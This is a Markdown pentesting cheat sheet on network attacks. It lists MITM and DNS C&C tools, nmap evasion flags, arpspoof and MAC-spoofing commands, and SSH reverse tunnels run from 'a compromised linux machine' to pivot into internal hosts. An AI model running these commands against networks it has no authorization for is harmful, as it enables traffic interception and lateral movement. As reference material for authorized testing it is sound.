# NETWORK

* [Spoofr](https://github.com/d4rkcat/Spoofr) - ARP poison and sniff with DNS spoofing, urlsnarf, driftnet, ferret, dsniff, sslstrip and tcpdump  
* [ProxyChains](http://proxychains.sourceforge.net/) - TCP and DNS through proxy server. HTTP and SOCKS
* arpspoof
* [Ettercap](http://ettercap.github.io/ettercap/) - suite for man in the middle attacks
* netdiscover
* [Yersinia](http://www.yersinia.net/) - network tool designed to take advantage of weaknesses in different network protocols
* [iodine](https://github.com/yarrick/iodine) - tunnel IPv4 data through a DNS server
* [dnscat2](https://github.com/iagox86/dnscat2) - encrypted C&C over DNS
* [MITMf](https://github.com/byt3bl33d3r/MITMf) - framework for MITM attacks
* [socat](http://www.dest-unreach.org/socat/) - like netcat, extended design

Discovery
---------
`netdiscover`  

DNS Cache Snooping
------------------

`nmap -sU -p 53 --script dns-cache-snoop.nse 8.8.8.8`

Wireshark
---------

Filters:
```
tcp.port==25
tcp.srcport!=53
tcp.dstport==80
ip.addr == 10.0.0.1
ip.addr != 10.0.0.1
ip.src==192.168.0.0/16
!udp
smb || dns || icmp
```

NMAP
----

`-iR` use random IP addresses  
`-iL` scan form file  
`-sT` connect scan (3-way handshake)  
`-sS` stealth scan (SYN)  
`-sA` ACK method  
`-vv` increased verbosity  
Spoof MAC: `--spoof-mac Cisco`  
Bad checksum: `--badsum`  
Source port spoof: `--source-port 53`  

* Output:  
`-oN` same as on screen  
`-oG` greppable format  
`-oX` XML format  
`-oA` all formats  

* While scanning:  
`p` packet tracing  
`v` verbosity  

TCP/IP
======

OSI Model
---------

1. Physical (cables, hubs); PDU: bit
2. Data Link (frames); PDU: frame
3. Network (packets); PDU: packet
4. Transport (TCP); PDU: segment (TCP), datagram (UDP)
5. Session (logical ports); PDU (5-7 layers): data (clear text, encrypted, compressed)
6. Presentation (ASCII)
7. Application (SMTP)

TCP Flags
---------

* CWR – Congestion Window Reduced (CWR) flag is set by the sending host to indicate that it received a TCP segment with the ECE flag set (added to header by RFC 3168).
* ECE (ECN-Echo) – indicate that the TCP peer is ECN capable during 3-way handshake (added to header by RFC 3168).
* URG – indicates that the URGent pointer field is significant
* ACK – indicates that the ACKnowledgment field is significant (Sometimes abbreviated by tcpdump as ".")
* PSH – Push function
* RST – Reset the connection (Seen on rejected connections)
* SYN – Synchronize sequence numbers (Seen on new connections)
* FIN – No more data from sender (Seen after a connection is closed)

Classes
-------

Class A: 0.0.0.0 - 127.255.255.255; Default subnet mask: 255.0.0.0; Addresses per network: 16,777,216  
Class B: 128.0.0.0 - 191.255.255.255; Defaut subnet mask: 255.255.0.0; Addresses per network: 65,536  
Class C: 192.0.0.0 - 223.255.255.255; Default subnet mask: 255.255.255.0; Addresses per network: 256  
Class D (multicast): 224.0.0.0 - 239.255.255.255  

Other
=====

* MAC address spoof: `ifconfig eth0 hw ether 00:11:22:33:44:55`  
* ARP spoof:
```
arpspoof -i eth0 192.168.0.1
arpspoof -t 10.0.0.1 10.0.0.2
arpspoof -t 10.0.0.2 10.0.0.1
```  
* View routing tables: `netstat -rn`  
* Turn off local DNS servers:
```
netsh inerface IPv4 set dnsserver "Local Area connecton" static 0.0.0.0 both
ipconfig /dlushdns
www.dnsleaktest.com
```
* Port forwarding/redirection:
```
Proxychains has a config file /etc/proxychains.conf. Don't forget to edit the port number that is used for redirection.

  ssh -f -N -R 5555:127.0.0.1:22 root@192.168.32.150

Port redirection:

  ssh root@192.168.32.122 -R 333:10.1.1.230:80

For example, 32.122 is my local kali IP. I run the above command on a compromised linux machine. 10.1.1.230:80 is what I want to see. Then once the command is run, I open up localhost:333 on my local kali and actually see what's in 10.1.1.230:80.
```
